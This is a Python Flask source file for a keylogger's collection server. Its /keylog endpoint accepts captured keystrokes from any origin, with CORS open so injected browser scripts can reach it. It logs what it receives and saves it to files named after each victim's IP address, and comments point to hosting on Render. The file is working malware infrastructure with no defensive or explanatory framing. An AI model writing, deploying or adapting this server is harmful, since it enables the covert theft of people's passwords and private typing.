from flask import Flask, request
from flask_restful import Api, Resource, reqparse
from flask_cors import CORS
from datetime import datetime
import logging
logging.basicConfig(level=logging.INFO)

app = Flask(__name__)
CORS(app)

@app.route('/keylog', methods=['POST'])
def post():
    parser = reqparse.RequestParser()
    parser.add_argument('logged', required=True)
    args = parser.parse_args()
    logged = args['logged']

    logging.info(f"[KEYLOG] Received: {logged}")  # 👈 Will show up in Render Logs

    source = request.remote_addr
    savelogs(logged, source)
    return {'message' : source + ": " + logged }, 200

@app.route('/home', methods=['GET'])
def home():
    return {'message' : "Welcome"}, 200

def savelogs(log, source):
    now = datetime.now()
    nowtime = now.strftime("%d-%m-%Y_%H:%M:%S")
    line = f"{nowtime} ({source}): {log}"
    print(line)  # ✅ Print to Render Logs
    # Optional: Save to file (ephemeral)
    try:
        with open(source + ".log", "a") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"File write error: {e}")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
